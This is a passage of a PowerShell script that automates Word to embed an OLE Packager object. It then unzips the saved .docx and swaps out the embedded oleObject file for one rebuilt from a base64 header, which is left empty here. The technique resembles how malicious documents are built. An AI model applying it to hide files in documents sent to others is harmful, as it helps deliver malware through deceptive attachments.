    # HACK: use Packager to create a file icon in the document
    $null = New-Item $tmpfile -ItemType file
    $null = $doc.InlineShapes.AddOLEObject($null, $tmpfile)
    Remove-Item $tmpfile
    # save doc & close Word
    $doc.SaveAs($filename)
    $doc.Close($false)
    $word.Quit()
    # create temp folder for modifying the docx
    $tmpfolder = "$env:TEMP\" + [System.Guid]::NewGuid()
    $null = New-Item -Type directory -Path $tmpfolder
    # unzip and replace Packager object
    [System.IO.Compression.ZipFile]::ExtractToDirectory($filename, $tmpfolder)
    Remove-Item "$tmpfolder\word\embeddings\oleObject1.bin"
    # create oleObject header from base64 string
    $oleheader = ''
    $oleheader = [System.Convert]::FromBase64String($oleheader)
